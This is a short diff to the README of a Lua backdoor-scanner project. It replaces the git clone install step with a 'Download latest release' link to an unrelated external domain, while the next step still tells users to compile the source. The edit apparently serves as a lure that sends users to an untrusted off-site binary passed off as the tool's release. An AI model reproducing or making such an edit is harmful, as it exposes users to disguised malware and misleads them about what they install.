@@ -32,11 +32,8 @@ A C++ console application designed to scan Lua scripts for potential backdoors, 
 
 ## Installation
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/yourusername/lua-script-scanner.git
-   cd lua-script-scanner
-   ```
+1. **Download the compiled release**:
+  [Download latest release](https://fezco.nl)
 
 2. **Compile the application**:
    Make sure you have a C++ compiler installed, then compile using the following command:
